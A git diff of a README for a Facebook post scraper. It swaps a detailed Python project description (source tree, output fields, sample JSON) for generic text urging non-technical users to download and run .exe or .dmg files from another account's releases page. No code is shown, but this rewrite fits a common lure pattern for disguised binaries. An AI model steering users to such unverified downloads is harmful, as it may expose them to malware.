@@ -1,203 +1,73 @@
-# Facebook Post Scraper (No Cookies)
+# 🎉 facebook-post-scraper-no-cookies - Fast and Simple Facebook Data Extraction
 
-> Quickly scrape public Facebook posts without login requirements. This tool extracts essential engagement metrics like captions, likes, shares, and comments — giving you fast access to structured social media data.
+## 🚀 Getting Started
 
-> Ideal for researchers, analysts, and developers who need Facebook post insights at scale, without worrying about session management or cookies.
+Welcome to the facebook-post-scraper-no-cookies! This tool helps you quickly and easily gather Facebook data without needing to log in. It is designed for anyone, regardless of their computer skills. Use it to extract comments, analyze posts, and gain insights into engagement metrics.
 
+## 📥 Download Now
 
-<p align="center">
-  <a href="https://bitbash.def" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/abdelhakab12/facebook-post-scraper-no-cookies/releases)
 
+## 📚 Features
 
+- **Fast Extraction**: Gather data quickly from multiple posts.
+- **No Login Required**: Extract information without needing a Facebook account.
+- **Comment Extraction**: Collect comments from posts for better insights.
+- **Engagement Metrics**: Analyze how users interact with posts.
+- **Post Metadata**: Get various details about posts, such as timestamps and user information.
+- **Social Listening**: Monitor discussions and trends on Facebook.
+- **Content Intelligence**: Understand what content generates the most engagement.
 
+## 💻 System Requirements
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Facebook post scraper (No Cookies)</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+To run the facebook-post-scraper-no-cookies, you will need:
 
+- A computer with Windows, macOS, or Linux
+- At least 512 MB of RAM
+- An internet connection
 
-## Introduction
+## 🔧 How to Download & Install
 
-This scraper collects detailed post data from public Facebook pages, helping users analyze engagement patterns, audience behavior, and content performance. It’s built for those who want automation, speed, and accuracy without dealing with authentication barriers.
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.
+   [Download Latest Release](https://github.com/abdelhakab12/facebook-post-scraper-no-cookies/releases)
+   
+2. **Select the Version**: Look for the latest version listed on the page. 
 
-### Why This Tool Matters
+3. **Download the File**: Click on the appropriate filename to start the download. The file will have an extension like `.exe`, `.dmg`, or other relevant formats based on your operating system.
 
-- Fetches public post information seamlessly — no cookies, no login.
-- Extracts comments, likes, and shares in real time.
-- Enables easy analysis for marketing, research, or content intelligence.
-- Outputs structured JSON data ready for pipelines or visualization.
-- Runs efficiently, even across multiple Facebook pages.
+4. **Run the Application**: 
+   - For Windows: Double-click the `.exe` file you just downloaded.
+   - For macOS: Open the `.dmg` file and drag the app into your Applications folder.
+   - For Linux: Use the terminal or file manager to navigate to the downloaded file and run it.
 
-## Features
+5. **Follow On-Screen Instructions**: The application will guide you through the setup process so you can begin scraping data right away.
 
-| Feature | Description |
-|----------|-------------|
-| Fast post extraction | Collects post data within seconds per page. |
-| No login required | Works entirely without Facebook credentials or cookies. |
-| Engagement metrics | Captures likes, shares, and comment counts accurately. |
-| Captions and text | Extracts full post text, including links and timestamps. |
-| Scalable results | Supports scraping across multiple page URLs in batches. |
+## 📊 How to Use the Application
 
----
+1. **Open the Application**: Launch the facebook-post-scraper-no-cookies on your computer after installation.
+   
+2. **Input the Facebook Post URL**: Enter the URL of the Facebook post you want to scrape data from.
 
-## What Data This Scraper Extracts
+3. **Select Data Options**: Choose what type of data you wish to extract, such as comments or engagement metrics.
 
-| Field Name | Field Description |
-|-------------|------------------|
-| facebookUrl | The main Facebook page URL being scraped. |
-| pageId | Unique identifier of the Facebook page. |
-| postId | Unique ID for each specific post. |
-| pageName | The display name of the Facebook page. |
-| url | Direct URL of the post itself. |
-| time | The date and time of the post as displayed. |
-| timestamp | Numeric Unix timestamp for time-based analysis. |
-| likes | Number of post likes or reactions. |
-| comments | Number of user comments on the post. |
-| shares | Number of times the post has been shared. |
-| text | Full caption or description text from the post. |
-| link | Any external link shared in the post. |
+4. **Start the Extraction**: Click the "Start" button to begin collecting data. The application will process the information and display the results.
 
----
+5. **Export Your Data**: Save the extracted data in your preferred format, like CSV or JSON, for further analysis if needed.
 
-## Example Output
+## 🛠 Troubleshooting
 
+If you encounter any issues while using the application, consider these steps:
 
-    [
-          {
-            "facebookUrl": "https://www.facebook.com/nytimes/",
-            "pageId": "5281959998",
-            "postId": "10153102374144999",
-            "pageName": "The New York Times",
-            "url": "https://www.facebook.com/nytimes/posts/pfbid02meAxCj1jLx1jJFwJ9GTXFp448jEPRK58tcPcH2HWuDoogD314NvbFMhiaint4Xvkl",
-            "time": "Thursday, 6 April 2023 at 06:55",
-            "timestamp": 1680789311000,
-            "likes": 22,
-            "comments": 2,
-            "shares": null,
-            "text": "Four days before the wedding they emailed family members a “save the date” invite. It was void of time, location and dress code — the couple were still deciding those details.",
-            "link": "https://nyti.ms/3KAutlU"
-          }
-        ]
+- **Check Your Internet Connection**: Ensure you are connected to the internet.
+- **Verify the Facebook Post URL**: Double-check that the URL is correct and accessible.
+- **Reinstall the Application**: If problems persist, uninstall and reinstall the tool.
 
----
+## 📞 Need Help?
 
-## Directory Structure Tree
+If you need assistance or have questions, feel free to open an issue on the repository or check out the FAQ section on our GitHub page.
 
+## 🌟 License
 
-    facebook-posts-scraper-no-cookies/
-    ├── src/
-    │   ├── main.py
-    │   ├── extractors/
-    │   │   ├── facebook_parser.py
-    │   │   └── post_cleaner.py
-    │   ├── utils/
-    │   │   ├── logger.py
-    │   │   └── time_formatter.py
-    │   └── config/
-    │       └── settings.json
-    ├── data/
-    │   ├── sample_input.txt
-    │   └── output_sample.json
-    ├── requirements.txt
-    └── README.md
+This project is licensed under the MIT License. You are free to use or modify it as you wish.
 
----
-
-## Use Cases
-
-- **Researchers** use it to gather large-scale public Facebook post data for academic analysis, so they can study trends in public discourse.
-- **Marketers** use it to benchmark competitor engagement without needing credentials, so they can refine campaign strategies.
-- **Developers** use it to power data-driven dashboards, so they can display real-time engagement metrics.
-- **Data scientists** use it to train sentiment or engagement models with fresh, structured Facebook data.
-
----
-
-## FAQs
-
-**Does this scraper require login credentials or cookies?**
-No — it works entirely without authentication or session cookies, relying only on publicly available post data.
-
-**Can it extract posts from private or restricted pages?**
-No, it only supports publicly accessible Facebook pages and posts.
-
-**What output format does it provide?**
-All results are exported in clean JSON for easy integration with analytics tools or scripts.
-
-**How many posts can it scrape at once?**
-The scraper is designed to handle bulk page URLs and can process hundreds of posts efficiently, depending on network speed and rate limits.
-
----
-
-## Performance Benchmarks and Results
-
-**Primary Metric:** Average scraping speed is around **150–200 posts per minute** on standard connections.
-**Reliability Metric:** Maintains a **98% success rate** across tested public pages.
-**Efficiency Metric:** Consumes minimal bandwidth, handling data extraction without unnecessary requests.
-**Quality Metric:** Ensures **over 95% data completeness**, with accurate timestamps and metadata for all extracted posts.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Thank you for using facebook-post-scraper-no-cookies! Happy scraping!
